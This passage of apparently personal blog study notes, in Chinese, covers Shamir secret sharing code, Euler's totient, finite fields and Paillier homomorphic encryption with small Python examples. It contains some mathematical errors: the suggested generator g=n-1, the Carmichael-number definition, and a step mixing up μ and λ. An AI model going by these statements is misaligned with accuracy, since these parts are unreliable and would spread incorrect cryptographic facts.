class="string">f&quot;秘密s:<span class="subst">&#123;secret&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="comment">#第一步:生成每个人的份额</span></span><br><span class="line">    shares=generate_shares(n,k,secret)<span class="comment">#生成每个人的份额</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;每个人的份额是:<span class="subst">&#123;<span class="string">&quot;, &quot;</span>.join(<span class="built_in">str</span>(share) <span class="keyword">for</span> share <span class="keyword">in</span> shares)&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="comment">#第二部:重构秘密</span></span><br><span class="line">    pool=random.sample(shares,k)<span class="comment">#随机从shares列表中随机选择n个不重复的元素</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;结合份额:<span class="subst">&#123;<span class="string">&quot;,&quot;</span>.join(<span class="built_in">str</span>(share) <span class="keyword">for</span> share <span class="keyword">in</span> pool)&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;秘密重构:<span class="subst">&#123;reconstruct_secret(pool)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 密码学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>公钥密码学的数学基础1</title>
      <link href="/2025/04/05/%E5%85%AC%E9%92%A5%E5%AF%86%E7%A0%81%E5%AD%A6%E7%9A%84%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%801/"/>
      <url>/2025/04/05/%E5%85%AC%E9%92%A5%E5%AF%86%E7%A0%81%E5%AD%A6%E7%9A%84%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%801/</url>
      
        <content type="html"><![CDATA[<h1 id="公钥密码学有关知识"><a href="#公钥密码学有关知识" class="headerlink" title="公钥密码学有关知识"></a>公钥密码学有关知识</h1><p>作者：hxd</p><p>日期：2025年3月28日</p><h2 id="欧拉函数的知识"><a href="#欧拉函数的知识" class="headerlink" title="欧拉函数的知识"></a>欧拉函数的知识</h2><p>欧拉函数（Euler’s Totient Function），记作$\phi(n)$，是数论中的一个重要函数，表示小于或等于正整数$n$且与$n$互质的正整数的个数。这里“互质”指的是最大公约数为1。</p><h3 id="欧拉函数的定义"><a href="#欧拉函数的定义" class="headerlink" title="欧拉函数的定义"></a>欧拉函数的定义</h3><p>对于正整数$n$，欧拉函数$\phi(n)$定义为：</p><p>$\phi(n) = \text{小于或等于 } n \text{ 且与 } n \text{ 互质的正整数的个数}$</p><h3 id="欧拉函数的性质"><a href="#欧拉函数的性质" class="headerlink" title="欧拉函数的性质"></a>欧拉函数的性质</h3><ol><li><p><strong>对于素数$p$：</strong></p><script type="math/tex; mode=display">\phi(p) = p - 1</script><p>因为素数与所有小于它的正整数都互质。</p></li><li><p><strong>对于素数的幂$p^k$：</strong></p></li></ol><script type="math/tex; mode=display">\phi(p^k) = p^k - p^{k-1}</script><p>   这是因为在$1$到$p^k$之间，只有$p$的倍数（共有$p^{k-1}$个）不与$p^k$互质。</p><ol><li><p><strong>积性函数</strong>：<br>如果两个正整数$a$和$b$互质（即$\gcd(a, b) = 1$），则：</p><script type="math/tex; mode=display">\phi(ab) = \phi(a) \cdot \phi(b)</script></li><li><p><strong>一般公式</strong>：<br>如果$n$的质因数分解为：</p><script type="math/tex; mode=display">n = p_1^{k_1} p_2^{k_2} \cdots p_m^{k_m}</script></li></ol><p>   则欧拉函数可以通过以下公式计算：</p><script type="math/tex; mode=display">   \phi(n) = n \left(1 - \frac{1}{p_1}\right)\left(1 - \frac{1}{p_2}\right) \cdots \left(1 - \frac{1}{p_m}\right)</script><h3 id="计算示例"><a href="#计算示例" class="headerlink" title="计算示例"></a>计算示例</h3><ol><li>计算$\phi(12)$：<ul><li>质因数分解：$12 = 2^2 \times 3$</li><li>应用公式：</li><li>验证：小于12且与12互质的数为1, 5, 7, 11，共4个。</li></ul></li><li>计算$\phi(7)$：<ul><li>7是素数，所以：</li><li>验证：小于7且与7互质的数为1, 2, 3, 4, 5, 6，共6个。</li></ul></li></ol><p>$\phi(12) = 12 \times \left(1 - \frac{1}{2}\right) \times \left(1 - \frac{1}{3}\right) = 12 \times \frac{1}{2} \times \frac{2}{3} = 4$</p><p>$\phi(7) = 7 - 1 = 6$</p><h3 id="欧拉定理"><a href="#欧拉定理" class="headerlink" title="欧拉定理"></a>欧拉定理</h3><p>欧拉函数在欧拉定理中扮演重要角色。欧拉定理指出，如果两个正整数$a$和$n$互质，则：</p><p>$a^{\phi(n)} \equiv 1 \pmod{n}$</p><p>这是费马小定理的推广（当$n$为素数时，$\phi(n) = n - 1$，即费马小定理）。</p><hr><h3 id="为什么在-1-到-p-k-之间，只有-p-的倍数不与-p-k-互质？"><a href="#为什么在-1-到-p-k-之间，只有-p-的倍数不与-p-k-互质？" class="headerlink" title="为什么在$1$到$p^k$之间，只有$p$的倍数不与$p^k$互质？"></a>为什么在$1$到$p^k$之间，只有$p$的倍数不与$p^k$互质？</h3><p>要理解这一点，我们需要明确以下几个概念：</p><ol><li><strong>互质的定义</strong>：两个数$a$和$b$互质，当且仅当$\gcd(a, b) = 1$。</li><li>$p^k$的性质：$p$是素数，$p^k$的唯一质因数是$p$。因此，任何与$p^k$不互质的数必须包含$p$作为其质因数（即能被$p$整除）。</li></ol><h4 id="关键观察："><a href="#关键观察：" class="headerlink" title="关键观察："></a>关键观察：</h4><ul><li>在$1$到$p^k$之间，不与$p^k$互质的数必须满足$\gcd(m, p^k) \neq 1$。由于$p^k$的唯一质因数是$p$，这意味着：</li><li>即$m$是$p$的倍数。</li><li>因此，不与$p^k$互质的数就是$p$的倍数。</li></ul><p>$\gcd(m, p^k) \neq 1 \iff p \mid m$</p><h4 id="p-的倍数的个数："><a href="#p-的倍数的个数：" class="headerlink" title="$p$的倍数的个数："></a>$p$的倍数的个数：</h4><p>在$1$到$p^k$之间，$p$的倍数为：</p><p>$p, 2p, 3p, \ldots, p^{k-1} \cdot p = p^k$</p><p>这些数的形式为$m = p \cdot t$，其中$t = 1, 2, \ldots, p^{k-1}$。因此，$p$的倍数的总数为$p^{k-1}$。</p><h4 id="举例验证："><a href="#举例验证：" class="headerlink" title="举例验证："></a>举例验证：</h4><p>以$p=2$和$k=3$（即$p^k = 8$）为例：</p><ul><li>$1$到$8$之间的数：1, 2, 3, 4, 5, 6, 7, 8。</li><li>其中$2$的倍数为：2, 4, 6, 8，共$4 = 2^{3-1} = 2^2$个。</li><li>与$8$不互质的数就是这些$2$的倍数（因为$\gcd(2,8)=2$,$\gcd(4,8)=4$, …,$\gcd(8,8)=8$）。</li></ul><hr><h2 id="欧拉函数"><a href="#欧拉函数" class="headerlink" title="欧拉函数"></a>欧拉函数</h2><p>欧拉函数$\phi(n)$定义为小于或等于$n$且与$n$互质的正整数的个数。对于任意正整数$n$，如果其质因数分解为：</p><p>$n = p_1^{k_1} p_2^{k_2} \cdots p_m^{k_m},$</p><p>其中$p_1, p_2, \ldots, p_m$是不同的质数，$k_1, k_2, \ldots, k_m$是它们的幂次，那么欧拉函数可以通过以下公式计算：</p><p>$\phi(n) = n \left(1 - \frac{1}{p_1}\right)\left(1 - \frac{1}{p_2}\right) \cdots \left(1 - \frac{1}{p_m}\right).$</p><h3 id="为什么这个公式成立？"><a href="#为什么这个公式成立？" class="headerlink" title="为什么这个公式成立？"></a>为什么这个公式成立？</h3><p>这个公式的推导基于<strong>容斥原理（Inclusion-Exclusion Principle）</strong>，即通过逐步排除不满足条件的数来计算满足条件的数的个数。</p><hr><h3 id="具体推导过程"><a href="#具体推导过程" class="headerlink" title="具体推导过程"></a>具体推导过程</h3><ol><li><strong>初始情况</strong>：<br>在$1$到$n$之间，总共有$n$个数。我们需要计算其中与$n$<strong>互质</strong>的数的个数，即这些数不被$n$的任何质因数$p_1, p_2, \ldots, p_m$整除。</li><li>排除被$p_i$整除的数：<ul><li>对于每个质因数$p_i$，$1$到$n$之间能被$p_i$整除的数的个数为$\frac{n}{p_i}$（因为每隔$p_i$个数就有一个$p_i$的倍数）。</li><li>因此，我们需要从总数$n$中减去这些数的个数：</li><li>但这样会<strong>多减</strong>了那些同时被多个$p_i$整除的数（比如同时被$p_1$和$p_2$整除的数）。</li></ul></li><li>加回被$p_i p_j$整除的数（容斥原理）：<ul><li>对于每对不同的质因数$p_i$和$p_j$，$1$到$n$之间能被$p_i p_j$整除的数的个数为$\frac{n}{p_i p_j}$。</li><li>我们需要加回这些数，因为它们被减去了两次（一次在$p_i$，一次在$p_j$）：</li><li>但这样又会<strong>多加</strong>那些同时被三个质因数整除的数。</li></ul></li><li><strong>继续容斥</strong>：<ul><li>对于三个质因数的组合$p_i p_j p_k$，我们需要再减去$\frac{n}{p_i p_j p_k}$，以此类推。</li><li>最终，根据容斥原理，$\phi(n)$可以表示为：</li></ul></li><li><strong>因式分解</strong>：<br>观察上式，可以发现它实际上是以下乘积的展开形式：<ul><li>展开这个乘积时，会得到：</li><li>这与容斥原理的表达式一致。</li></ul></li></ol><p>$n - \sum_{i=1}^m \frac{n}{p_i}.$</p><p>$n - \sum_{i=1}^m \frac{n}{p_i} + \sum_{1 \leq i &lt; j \leq m} \frac{n}{p_i p_j}.$</p><p>$\phi(n) = n - \sum_{i=1}^m \frac{n}{p_i} + \sum_{1 \leq i &lt; j \leq m} \frac{n}{p_i p_j} - \sum_{1 \leq i &lt; j &lt; k \leq m} \frac{n}{p_i p_j p_k} + \cdots + (-1)^m \frac{n}{p_1 p_2 \cdots p_m}.$</p><p>$\phi(n) = n \left(1 - \frac{1}{p_1}\right)\left(1 - \frac{1}{p_2}\right) \cdots \left(1 - \frac{1}{p_m}\right).$</p><p>$n \left(1 - \sum_{i=1}^m \frac{1}{p_i} + \sum_{1 \leq i &lt; j \leq m} \frac{1}{p_i p_j} - \cdots + (-1)^m \frac{1}{p_1 p_2 \cdots p_m}\right),$</p><hr><h3 id="直观理解"><a href="#直观理解" class="headerlink" title="直观理解"></a>直观理解</h3><ul><li>公式$\phi(n) = n \prod_{p \mid n} \left(1 - \frac{1}{p}\right)$可以理解为：<br>从$1$到$n$的所有数中，排除掉所有能被$n$的质因数整除的数，剩下的就是与$n$互质的数。</li><li>每个$\left(1 - \frac{1}{p_i}\right)$表示“保留不被$p_i$整除的数的比例”。</li></ul><hr><h3 id="例子验证"><a href="#例子验证" class="headerlink" title="例子验证"></a>例子验证</h3><p>以$n = 12$为例：</p><ul><li>质因数分解：$12 = 2^2 \times 3$。</li><li>应用公式：</li><li>验证：小于等于 12 且与 12 互质的数为 1, 5, 7, 11，共 4 个。</li></ul><p>$\phi(12) = 12 \left(1 - \frac{1}{2}\right)\left(1 - \frac{1}{3}\right) = 12 \times \frac{1}{2} \times \frac{2}{3} = 4.$</p><h2 id="有限域"><a href="#有限域" class="headerlink" title="有限域"></a>有限域</h2><p><strong>有限域（Finite Field）</strong>，也称为<strong>伽罗瓦域（Galois Field）</strong>，是一个包含有限个元素的域。域是一种代数结构，支持加、减、乘、除（除零以外）等运算，并且满足特定的性质（如结合律、交换律、分配律等）。</p><p>当提到<strong>GF(q)</strong>时，它表示一个包含$q$个元素的有限域。如果$q$是一个素数，那么<strong>GF(q)</strong>是一个由模$q$的整数构成的域。</p><hr><h4 id="GF-q-的定义"><a href="#GF-q-的定义" class="headerlink" title="GF(q) 的定义"></a><strong>GF(q) 的定义</strong></h4><ol><li>$q$是素数：<ul><li>当$q$是一个素数时，<strong>GF(q)</strong>可以简单地表示为模$q$的整数集合：</li><li>加法和乘法运算都是模$q$的运算。</li></ul></li><li><strong>域的性质</strong>：<ul><li><strong>加法</strong>：$a + b \mod q$</li><li><strong>乘法</strong>：$a \cdot b \mod q$</li><li><strong>加法逆元</strong>：对于任意$a$，存在$-a$使得$a + (-a) \equiv 0 \mod q$。</li><li><strong>乘法逆元</strong>：对于任意非零元素$a$，存在$a^{-1}$使得$a \cdot a^{-1} \equiv 1 \mod q$。</li></ul></li><li><strong>例子</strong>：<ul><li>如果$q = 5$，则$GF(5) = {0, 1, 2, 3, 4}$。</li><li>加法示例：$3 + 4 = 7 \equiv 2 \mod 5$。</li><li>乘法示例：$3 \cdot 4 = 12 \equiv 2 \mod 5$。</li><li>乘法逆元示例：$3^{-1} = 2$，因为$3 \cdot 2 = 6 \equiv 1 \mod 5$。</li></ul></li></ol><p>$GF(q) = {0, 1, 2, \dots, q-1}$</p><hr><h4 id="为什么-q-必须是素数？"><a href="#为什么-q-必须是素数？" class="headerlink" title="为什么$q$必须是素数？"></a>为什么$q$必须是素数？</h4><ol><li><strong>保证乘法逆元的存在</strong>：<ul><li>如果$q$是素数，那么对于任意非零元素$a \in GF(q)$，都存在一个乘法逆元$a^{-1}$，使得$a \cdot a^{-1} \equiv 1 \mod q$。</li><li>如果$q$不是素数，某些元素可能没有乘法逆元，从而不满足域的定义。</li></ul></li><li><strong>例子</strong>：<ul><li>如果$q = 4$（不是素数），则$GF(4) = {0, 1, 2, 3}$。</li><li>元素$2$没有乘法逆元，因为$2 \cdot 1 = 2 \not\equiv 1 \mod 4$，且$2 \cdot 3 = 6 \equiv 2 \mod 4$。</li></ul></li></ol><hr><h4 id="GF-q-的扩展：-q-是素数的幂"><a href="#GF-q-的扩展：-q-是素数的幂" class="headerlink" title="GF(q) 的扩展：$q$是素数的幂"></a>GF(q) 的扩展：$q$是素数的幂</h4><p>当$q$是素数的幂（即$q = p^n$，其中$p$是素数，$n$是正整数）时，<strong>GF(q)</strong>仍然是一个有限域，但它的构造更加复杂。这种情况下，<strong>GF(q)</strong>的元素不再是简单的整数，而是多项式或其他代数结构的表示。</p><ol><li><p><strong>例子</strong>：</p><ul><li>$GF(2^3) = GF(8)$是一个包含 8 个元素的有限域。</li><li>它的元素可以表示为多项式，例如$0, 1, x, x+1, x^2, x^2+1, x^2+x, x^2+x+1$。</li></ul></li><li><p><strong>运算规则</strong>：</p><ul><li>加法和乘法基于多项式运算，并使用一个不可约多项式进行模运算。</li></ul></li></ol><hr><h4 id="GF-q-0-的概念"><a href="#GF-q-0-的概念" class="headerlink" title="GF(q)/{0}的概念"></a>GF(q)/{0}的概念</h4><p><strong>GF(q)/{0}</strong>表示在有限域<strong>GF(q)</strong>中移除零元素后的集合。换句话说，它是<strong>GF(q)</strong>中所有非零元素组成的集合。详细解释如下：</p><hr><ol><li><strong>GF(q)</strong>：<ul><li><strong>GF(q)</strong>是一个包含$q$个元素的有限域，其中$q$是一个素数或素数的幂。</li><li>如果$q$是素数，<strong>GF(q)</strong>可以表示为：</li><li>如果$q$是素数的幂（如$q = p^n$），<strong>GF(q)</strong>的元素通常是多项式或其他代数结构的表示。</li></ul></li><li><strong>GF(q)/{0}</strong>：<ul><li><strong>GF(q)/{0}</strong>表示从<strong>GF(q)</strong>中移除零元素后的集合。</li><li>即：</li><li>这个集合中的元素都是非零的。</li></ul></li></ol><p>$GF(q) = {0, 1, 2, \dots, q-1}$</p><p>$GF(q)/{0} = {1, 2, \dots, q-1}$</p><hr><h4 id="GF-q-0-的性质"><a href="#GF-q-0-的性质" class="headerlink" title="GF(q)/{0} 的性质"></a><strong>GF(q)/{0} 的性质</strong></h4><ol><li><strong>乘法群</strong>：<ul><li><strong>GF(q)/{0}</strong>构成一个乘法群（称为<strong>乘法循环群</strong>）。</li><li>在这个群中，每个非零元素都有一个乘法逆元，且乘法运算满足封闭性、结合律和交换律。</li></ul></li><li><strong>生成元</strong>：<ul><li>有限域的乘法群是一个循环群，<strong>GF(q)/{0}</strong>是一个循环群，因此存在一个生成元（原根）$g$，使得：</li><li>生成元的幂可以生成整个<strong>GF(q)/{0}</strong>。</li></ul></li><li><strong>阶数</strong>：<ul><li><strong>GF(q)/{0}</strong>的阶数（元素个数）是$q-1$。</li></ul></li></ol><p>$GF(q)/{0} = {g^0, g^1, g^2, \dots, g^{q-2}}$</p><hr><h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a><strong>例子</strong></h4><ol><li><strong>GF(5)</strong>：<ul><li>$GF(5) = {0, 1, 2, 3, 4}$。</li><li>$GF(5)/{0} = {1, 2, 3, 4}$。</li><li>这是一个乘法群，生成元可以是$2$或$3$。<ul><li>以$2$为生成元：</li><li>因此，$GF(5)/{0} = {2^0, 2^1, 2^2, 2^3} = {1, 2, 4, 3}$。</li></ul></li></ul></li><li><strong>GF(4)</strong>：<ul><li>$GF(4)$的元素可以表示为多项式：</li><li>$GF(4)/{0} = {1, x, x+1}$。</li><li>这是一个乘法群，生成元可以是$x$或$x+1$。</li></ul></li></ol><p>$2^1 = 2, \quad 2^2 = 4, \quad 2^3 = 3, \quad 2^4 = 1$</p><p>$GF(4) = {0, 1, x, x+1}$</p>]]></content>
      
      
      <categories>
          
          <category> 公钥密码学的数学基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>同态加密之Paillier同态加密</title>
      <link href="/2025/04/03/%E5%90%8C%E6%80%81%E5%8A%A0%E5%AF%86%E4%B9%8BPaillier%E5%90%8C%E6%80%81%E5%8A%A0%E5%AF%86/"/>
      <url>/2025/04/03/%E5%90%8C%E6%80%81%E5%8A%A0%E5%AF%86%E4%B9%8BPaillier%E5%90%8C%E6%80%81%E5%8A%A0%E5%AF%86/</url>
      
        <content type="html"><![CDATA[<h1 id="Paillier同态加密"><a href="#Paillier同态加密" class="headerlink" title="Paillier同态加密"></a>Paillier同态加密</h1><p>作者：hxd</p><p>日期：2025年3月28日</p><hr><h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>随着云计算和人工智能的兴起，如何实现安全有效地利用数据，对持有大量数字资产的企业来说至关重要。同态加密，是解决云计算和分布式机器学习中数据安全问题的关键技术，也是隐私计算中，横跨安全多方计算，联邦学习和可信执行环境多个技术分支的热门研究方向。</p><p>本文对经典同态加密算法Pailier算法及其相关技术进行介绍，重点分析了Paillier的实现原理和性能优化方案，同时对基于公钥的加密算法中的热门算法进行了横向对比。最后介绍了Paillier算法的一些实际应用。</p><p>【关键词】：同态加密，安全多方计算，联邦学习，隐私计算</p><h2 id="1-背景知识"><a href="#1-背景知识" class="headerlink" title="1 背景知识"></a>1 背景知识</h2><h3 id="1-1-同态加密"><a href="#1-1-同态加密" class="headerlink" title="1.1 同态加密"></a>1.1 同态加密</h3><p><strong>同态加密（Homomorphic Encryption，HE）是一种对加密数据进行处理的功能，是一种允许对密文进行计算操作并生成加密结果的加密技术。在密文上获得的计算结果被解密后与在明文上的计算结果相匹配。</strong>我的理解是可以在加密的数据上进行计算操作，并且得到的结果解密后与在原始数据上进行相同的计算操作得到的结果一致。</p><p>目前，同态加密可以分为三类：部分同态加密（Partially Homomorphic Encryption, PHE）也称为半同态加密、些许同态加密（Somewhat Homomorphic Encryption，SHE）和全同态加密（Fully Homomorphic Encryption, FHE）。半同态加密在数据加密后只持加法运算或乘法运算中的一种，根据其支持的运算的不同，又称为加法同态加密或乘法同态加密。半同态加密由于机制相对简单，相对于全同态加密技术，拥有着更好的性能。全同态加密对加密后的数据支持任意次数的加法和乘法运算。Paillier同态加密是一种半同态加密算法，仅支持加法同态。</p><h3 id="1-2-复合剩余类问题"><a href="#1-2-复合剩余类问题" class="headerlink" title="1.2 复合剩余类问题"></a>1.2 复合剩余类问题</h3><p>如果存在一个数</p><script type="math/tex; mode=display">y\in \mathbb{Z}_{n^2}^*</script><h3 id="1-3-二项式定理"><a href="#1-3-二项式定理" class="headerlink" title="1.3 二项式定理"></a>1.3 二项式定理</h3><p>二项式定理：$n\in \mathbb{N}^*$</p><script type="math/tex; mode=display">(a+b)^n=\sum_{r=0}^{n} C^r_{n} a^{n-r}b^r=C^0_{n} a^{n}+C^1_{n} a^{n-1}b+\cdots C^r_{n} a^{n-r}b^r+C^n_{n} b^n</script><p>当$a=1,b=n,n=x$时可以化成下面的形式：</p><script type="math/tex; mode=display">(1+n)^x=1+nx+\frac{x(x-1)n^2}{2!}+\cdots</script><p>可以化为</p><script type="math/tex; mode=display">(1+n)^x\equiv 1+nx(\mod n^2)</script><p>令$y=(1+n)^x \mod n^2 $，可化简为$x\equiv \frac{y-1}{n} (\mod n^2)$，再令$L(u)=\frac{u-1}n$</p><p>则</p><script type="math/tex; mode=display">\begin{equation}L\left((1+n)^{x} \bmod n^{2}\right) \equiv L(y) \equiv \frac{y-1}{n} \quad(\bmod n) \equiv x \quad(\bmod n) \end{equation}</script><p>即 $L\left((1+n)^{x}  \mod n^{2}\right) \equiv x \quad(\bmod n)$</p><h2 id="2-Paillier算法"><a href="#2-Paillier算法" class="headerlink" title="2 Paillier算法"></a>2 Paillier算法</h2><h3 id="2-1-密钥生成"><a href="#2-1-密钥生成" class="headerlink" title="2.1 密钥生成"></a>2.1 密钥生成</h3><p>类似于RSA算法，Paillier也拥有公钥和私钥对。</p><ol><li><p>随机选择两个大素数$p,q$且$p\ne q$，满足$gcd(pq,(p-1)(q-1))=1$，且满足$p,q$的长度相等。</p></li><li><p>计算$n=pq$以及$\lambda=lcm(p-1,q-1)$，这里$lcm$表示最小公倍数</p></li><li><p>随机选择$g\leftarrow \mathbb{Z}_{n^2}^*$</p></li><li><p>定义$L$函数：$L(x)=\frac{x-1}{n}$，计算$\mu=(L(g^\lambda \mod n^2))^{-1} \mod n$</p><p>公钥：$(n,g)$，私钥：$(\lambda,\mu)$</p></li></ol><p>例如：</p><ul><li><p>Alice选择两个大素数$p=11,q=19$</p></li><li><p>Alice计算$n=p*q=209$，并计算$\lambda=lcm(p-1,q-1)=(10,18)=90$</p></li><li><p>Alice选择一个随机整数$g=147\in \mathbb{Z}_{n^2}^*$</p></li><li><p>Alice定义函数$L(x)=\frac{x-1}{n}$，计算$\mu=(L(g^\lambda \mod n^2))^{-1} \mod n =153$</p></li></ul><p>所以现在Alice一共生成了6个数字：</p><script type="math/tex; mode=display">p=11,q=19,n=209,\lambda=90,g=147,\mu=153</script><p>公钥为$(n,g)=(209,147)$，私钥为$(\lambda,\mu)=(90,153)$</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p=<span class="number">11</span>;q=<span class="number">19</span>;n=<span class="number">209</span>;lambda1=<span class="number">90</span>;g=<span class="number">147</span></span><br><span class="line">L=<span class="keyword">lambda</span> x:(x-<span class="number">1</span>)/n</span><br><span class="line">mu=gmpy2.powmod(<span class="built_in">int</span>(L(gmpy2.mod(<span class="built_in">pow</span>(g,lambda1),<span class="built_in">pow</span>(n,<span class="number">2</span>)))),-<span class="number">1</span>,n)</span><br><span class="line"><span class="built_in">print</span>(mu)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/hxd77/BlogImage/master/BlogNotCDN/image-20250509154620547.png" alt="image-20250509154620547"></p><h3 id="2-3-2-加密"><a href="#2-3-2-加密" class="headerlink" title="2.3.2 加密"></a>2.3.2 加密</h3><ol><li><p>输入明文消息$m$，满足$0\le m\le n$</p></li><li><p>选择随机数$r$满足$0\le r\le n$且$r\in \mathbb{Z}_{n}^*$</p></li><li><p>计算密文$c=g^mr^n \mod n^2$</p></li></ol><p>例如：</p><ul><li>假设Bob需要加密明文$m=8$，且Bob收到了Alice发送来的公钥$(n,g)$</li><li>Bob选择随机数$r=3$</li><li>Bob计算密文$c=32948$</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c=gmpy2.mod(<span class="built_in">pow</span>(g,m)*<span class="built_in">pow</span>(r,n),<span class="built_in">pow</span>(n,<span class="number">2</span>))</span><br></pre></td></tr></table></figure><h3 id="2-2-解密"><a href="#2-2-解密" class="headerlink" title="2.2 解密"></a>2.2 解密</h3><ol><li><p>输入密文$c$，满足$c\in \mathbb{Z}_{n^2}^*$</p></li><li><p>计算明文消息$m=L(c^\lambda \mod n^2))\cdot\mu \mod n$</p></li></ol><p>例如：</p><ul><li><p>Bob发送密文$c$，且$c\in \mathbb{Z}_{n^2}^*$</p></li><li><p>Alice计算明文$m=L(c^\lambda \mod n^2))\cdot\mu \mod n=8$</p></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">m1=gmpy2.mod(L(gmpy2.mod(<span class="built_in">pow</span>(c,lambda1),<span class="built_in">pow</span>(n,<span class="number">2</span>)))*mu,n)</span><br></pre></td></tr></table></figure><h3 id="2-3-正确性证明"><a href="#2-3-正确性证明" class="headerlink" title="2.3 正确性证明"></a>2.3 正确性证明</h3><p>这里可以将$g$进行优化成$g=n-1,\lambda=\varphi(n)=(p-1)(q-1),\mu=\varphi(n)^{-1}\bmod n$</p><p>证明如下:</p><script type="math/tex; mode=display">\begin{equation}Dec(c)=m=L(c^\lambda \bmod n^2))\cdot\mu \bmod n=L((g^mr^n\bmod n^2)^\lambda \bmod n^2))\cdot \mu=L(g^{\lambda m}r^{\lambda n} \bmod n^2))\cdot \mu \bmod n\\\end{equation}</script><p>根据卡米切尔定理（Carmichael’s function）有：</p><script type="math/tex; mode=display">r^{\lambda n}\equiv 1\mod n^2</script><p>所以继续化简，且由$L\left((1+n)^{x}  \mod n^{2}\right) \equiv x \quad(\bmod n)$知，</p><script type="math/tex; mode=display">Dec(c)=L(g^{\lambda m}\mod n^2))\cdot \mu \mod n=\lambda m\cdot \mu \bmod n=\lambda m\cdot \frac{1}{\mu}\bmod n=m</script><blockquote><p><strong>Carmichael number</strong>的定义是，对于一个合数 $n$ ，如果所有与 $n$ 互质的正整数 $b$ ，都有 $b^{n-1} \equiv 1\left(\bmod n^{2}\right)$ 成立，则 $n$ 称为Carmichael number。其中 $0&lt;b&lt;n$<br>$r^{\lambda n} \bmod n^{2}=1$ 其实是<strong>Carmichael＇s theorem</strong>的一个推论，这里不再详细说明。<br>对两个数的乘积求余，与对这两个数先求余再相乘的结果相同</p></blockquote><h3 id="2-5-Paillier同态加密性质"><a href="#2-5-Paillier同态加密性质" class="headerlink" title="2.5 Paillier同态加密性质"></a>2.5 Paillier同态加密性质</h3><h3 id="2-5-1-加法"><a href="#2-5-1-加法" class="headerlink" title="2.5.1 加法"></a>2.5.1 加法</h3><script type="math/tex; mode=display">\begin{equation*}Dec(c_1  \cdot c_2 \bmod n^{2})=Dec\left(Enc\left(m_{1}, r_{1}\right) \cdot Enc\left(m_{2}, r_{2}\right) \bmod n^{2}\right)=m_{1}+m_{2} \bmod n \end{equation*}</script><p>这个公式的意思是，明文 $m_{1}$ 和 $m_{2}$ ，随机选择的加密因子随机数 $r_{1}$ 和 $r_{2}$ 。 $m_{1}$ 和 $m_{2}$ 加密后相乘再解密的结果，与 $m_{1}+m_{2}$ 对 $n$ 求余的结果相同。</p><h3 id="2-5-2-乘法"><a href="#2-5-2-乘法" class="headerlink" title="2.5.2 乘法"></a>2.5.2 乘法</h3><script type="math/tex; mode=display">\begin{align*}& Dec\left(Enc\left(m_{1}, r_{1}\right)^{m_{2}} \bmod n^{2}\right)=m_{1} m_{2} \bmod n  \\& Dec\left(Enc\left(m_{2}, r_{2}\right)^{m_{1}} \bmod n^{2}\right)=m_{1} m_{2} \bmod n \end{align*}</script><p>但是据我了解Paillier同态加密是不支持乘法同态的，仅支持密文乘标量，而不支持密文乘密文。一般地</p><script type="math/tex; mode=display">\begin{equation*}Dec\left(Enc\left(m_{1}, r_{1}\right)^{k} \bmod n^{2}\right)=k m_{1} \bmod n \end{equation*}</script><h3 id="2-5-3-证明"><a href="#2-5-3-证明" class="headerlink" title="2.5.3 证明"></a>2.5.3 证明</h3><h4 id="加法证明"><a href="#加法证明" class="headerlink" title="加法证明:"></a>加法证明:</h4><script type="math/tex; mode=display">\begin{gather*}Enc\left(m_{1}, r_{1}\right)=c_{1}=g^{m 1} \cdot r_{1}^{n} \bmod n^{2}  \\Enc\left(m_{2}, r_{2}\right)=c_{2}=g^{m 2} \cdot r_{2}^{n} \bmod n^{2}  \\c_{1} \cdot c_{2}=g^{m_1+m_2} \cdot\left(r_{1} \cdot r_{2}\right)^{n} \bmod n^{2}  \\Dec\left(c_{1} \cdot c_{2}\right) \equiv L\left(g^{\lambda\left(m_{1}+m_{2}\right)} \cdot\left(r_{1} \cdot r_{2}\right)^{\lambda n} \bmod n^{2}\right) \cdot \mu \bmod n  \\\equiv \lambda\left(m_{1}+m_{2}\right) \cdot \mu \quad(\bmod n) \\\equiv m_{1}+m_{2} \quad(\bmod n)\end{gather*}</script><p>其中 $\left(r_{1} \cdot r_{2}\right)^{\lambda n} \equiv 1\left(\bmod n^{2}\right)$ ，依然是利用Carmichael＇s theorem。也不要忘了 $\mu=\lambda^{-1}$ 。加法证毕。</p><h4 id="乘法证明"><a href="#乘法证明" class="headerlink" title="乘法证明:"></a>乘法证明:</h4><script type="math/tex; mode=display">\begin{gather*}& Enc\left(m_{1}, r_{1}\right)^{m_{2}} \bmod n^{2}=c_{1}^{m_2}=(g^{m_1} \cdot r_{1}^{n})^{m_2} \bmod n^{2}  \\&  Dec\left(Enc\left(m_{1}, r_{1}\right)^{m_{2}} \bmod n^{2}\right)=Dec\left(c_{1}^{m_2}\right)=L(g^{\lambda m_1} \cdot r_{1}^{\lambda n})^{m_2} \bmod n^{2}=L(g^{\lambda m_1 m_2} \cdot r_{1}^{\lambda n m2})\cdot \mu \bmod n^{2}=\lambda(m_1m_2)\cdot \mu=m_1m_2\\& Enc\left(m_{2}, r_{2}\right)^{m_{1}} \bmod n^{2}=c_{2}^{m1}=(g^{m 2} \cdot r_{1}^{n})^{m1} \bmod n^{2}\\& Dec\left(Enc\left(m_{2}, r_{2}\right)^{m_{1}} \bmod n^{2}\right)=Dec\left(c_{2}^{m_1}\right)=L(g^{\lambda m_2} \cdot r_{2}^{\lambda n})^{m_1} \bmod 